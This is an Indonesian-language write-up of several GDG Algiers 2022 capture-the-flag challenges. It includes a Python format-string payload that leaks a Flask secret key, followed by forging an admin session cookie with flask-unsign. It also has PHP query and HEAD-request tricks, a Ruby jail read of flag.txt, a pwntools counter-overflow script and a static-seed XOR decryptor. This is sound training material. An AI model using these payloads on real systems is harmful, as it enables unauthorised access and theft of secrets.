# WEB
## cookauth
Diberikan web dengan cookies yang dihex, cukup ganti dengan user admin.

![](Pasted%20image%2020221010110356.png)

![](Pasted%20image%2020221010110402.png)

![](Pasted%20image%2020221010110408.png)

## Validator
Python format string vulnerability dan JWT Forge.

kita diberikan file yang berisi source code.

dalam source tersebut ada beberapa baris code yang menarik, yaitu:

```python
# Utility functions

def wrap_error(e: Exception):
    return f"{e.__class__.__name__}: {e}"
```

```python
# MyDict class

class MyDict(dict):
    def __getattr__(self, *args, **kwargs):
        return self.get(*args, **kwargs)
    def __setattr__(self, *args, **kwargs):
        return self.__setitem__(*args, **kwargs)
```

dan

```python
...snip...
    except SchemaError as e:
        res.message = wrap_error(e)
        res.isError = True
        return res
```

dimana exception SchemaError ini akan di parse dengan format string dari fungsi "wrap_error", tapi bukan hanya disitu saja format stringnya, bisa kita lihat ke source code dari schema.py di fungsi "validate()" (https://github.com/keleshev/schema/blob/master/schema.py#L449)

```python
...snip...
        else:
            message = "%r does not match %r" % (s, data)
            message = self._prepend_schema_name(message)
            raise SchemaError(message, e.format(data) if e else None)
```


Nah sekarang kita sudah mendapatkan ketentuan untuk mengeksploitasi format string, yaitu adanya 2 atau lebih format string dalam eksekusi sebuah string (untuk referensi python format string bisa dilihat disini https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/)

### Eksploitasi

Setelah melihat kodenya kita menemukan parameter "invalidMsg" yang merupakan tempat masuknya eksploitasi format string tersebut.

Untuk eksploitasi saya mendapatkan referensi dari https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/ dengan sedikit penyesuaian, agar bisa mendapatkan __globals__  variable 

payload akhir

```
{.__setattr__.__globals__[app].secret_key}
```

kita kirim lewat http request

```http
POST /validate HTTP/1.1
Host: localhost:8080
Content-Length: 141
sec-ch-ua: "-Not.A/Brand";v="8", "Chromium";v="102"
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
sec-ch-ua-platform: "Linux"
Content-Type: application/json
Accept: */*
Origin: http://localhost:8080
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:8080/
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: session=eyJpc0FkbWluIjpmYWxzZX0.Y0C_aQ.u7XE04JffCqrpKfQTyUCQIxE0N8
Connection: close

{
  "schema":{
    "name":"str",
    "foo":"str"
  },
  "validMsg":"",
  "invalidMsg":"{.__setattr__.__globals__[app].secret_key}",
  "data":"{\"name\":\"dimas\"}"
}
```

maka kita akan mendaptkan response

```http
HTTP/1.1 200 OK
server: nginx/1.18.0
date: Sat, 08 Oct 2022 01:28:37 GMT
content-type: application/json
content-length: 85
connection: close

{"isError":true,"message":"SchemaMissingKeyError: 3PmqjTIyNHJe3i5psDJNFAkwoJyUZTwy"} <= ini secret keynya
```

kita tinggal melakukan jwt sign saja dan memasukkan cookienya ke website tersebut

```sh
flask-unsign --sign --cookie "{'isAdmin': True}" --secret 3PmqjTIyNHJe3i5psDJNFAkwoJyUZTwy
```

boom!!! kita mendapatkan flagnya 

![](Pasted%20image%2020221010111105.png)

## ezphp
untuk ini cukup tambahkan parameter
GET /?login=admin&pass=aaaa

request
```http
GET /?login=admin&pass=aaaa HTTP/1.1
Host: ezphp.chal.ctf.gdgalgiers.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=881d94b9173e6d6af0064d48f7972f97
Connection: close
```

response

```http
HTTP/1.1 200 OK
date: Sat, 08 Oct 2022 09:15:36 GMT
server: Apache/2.4.10 (Debian) PHP/5.3.29
x-powered-by: PHP/5.3.29
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
content-length: 38
content-type: text/html
connection: close

CyberErudites{NeV3R_tRU$T_pHP_MethoD$}
```

## ezphp (fixed)
saya mengambil referensi dari https://security.stackexchange.com/questions/126769/exploiting-md5-vulnerability-in-this-php-form

disini kita bisa mengeprint buffer text dari file flagnya dengan memanfaatkan trick HEAD

request pertama memakai HEAD trick

```http
HEAD /?login&pass HTTP/1.1
Host: ezphp-fixed.chal.ctf.gdgalgiers.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=b75d1a6267ae646c49393412dfb64d9a
Connection: close
```

maka request setelahnya akan mengandung buffer dari flagnya

request:

```http
GET /?login&pass HTTP/1.1
Host: ezphp-fixed.chal.ctf.gdgalgiers.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=b75d1a6267ae646c49393412dfb64d9a
Connection: close
```

response

```http
HTTP/1.1 200 OK
date: Sat, 08 Oct 2022 12:21:06 GMT
server: Apache/2.4.10 (Debian) PHP/5.3.29
x-powered-by: PHP/5.3.29
expires: Thu, 19 Nov 1981 08:52:00 GMT
cache-control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
pragma: no-cache
content-length: 62
content-type: text/html
connection: close

CyberErudites{svJZiv0xEgiEvitoKQbxM3ujGItEZlRo}Wrong password
```

# jail
## Red Diamond
Ruby jail, cukup simpel. tgl masukkin puts File.read("flag.txt")

![](Pasted%20image%2020221010110728.png)


# PWN
## Counter
diberikan binary dan source,  disini counter di-isi dfengan value awal 1, sementara untuk mendapatkan flag kita butuh value 0.

karena variabel counter itu char, cukup overflow sampai 255 kali.

![](Pasted%20image%2020221010110505.png)

![](Pasted%20image%2020221010110510.png)

exploit:

```python
from pwn import *

r = remote('pwn.chal.ctf.gdgalgiers.com', 1402)

while True:
    s = r.recvuntil(b'Counter: ');
    Counter = int(r.recvline().strip())
    if (Counter == 0):
        r.recvuntil(b'Choice: ')
        r.sendline(b'3')
        print(r.recvline())
        break

    print('Current Counter: ' + str(Counter))
    r.recvuntil(b'Choice: ')
    r.sendline(b'1')
```

# Reverse
## traditions
diberikan binary dengan data flag didalamnya.

data flag tersebut di encrypt dengan nilai random, namun seed disini static.

jadi cukup reproduce stepnya di c++

![](Pasted%20image%2020221010110604.png)

![](Pasted%20image%2020221010110608.png)

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
    srand(0x7E6u);

    char v7[] = { 21,
                  145,
                  42,
                  89,
                  114,
                  30,
                  217,
                  10,
                  182,
                  241,
                  42,
                  186,
                  95,
                  102,
                  112,
                  97,
                  79,
                  247,
                  209,
                  73,
                  214,
                  172,
                  180,
                  33,
                  178,
                  30,
                  148,
                  40,
                  90,
                  87,
                  170,
                  21,
                  199,
                  10,
                  200,
                  163,
                  240,
                  118,
                  3,
                  52,
                  136,
                  225,
                  36,
                  99,
                  194,
                  19,
                  90,
                  2 }

    for (int i = 0; i < 47; i++)
    {
        int rnd = rand();
        char key = (char)(((unsigned int)(rnd >> 31) >> 24) + rnd) - ((unsigned int)(rnd >> 31) >> 24);
        printf("%c", key ^ v7[i]);
    }
    return 0;
}
```

